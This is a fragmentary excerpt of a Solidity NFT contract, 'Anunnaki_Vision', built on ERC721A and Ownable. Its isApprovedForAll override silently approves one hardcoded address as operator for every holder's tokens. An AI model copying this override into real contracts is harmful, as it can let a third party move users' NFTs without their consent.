  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x0E8E657E1029a30c9d72E8D0c56DB98af1491994){return true;}
...
contract Anunnaki_Vision is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Anunnaki", "ANK", maxBatchSize_, collectionSize_) {
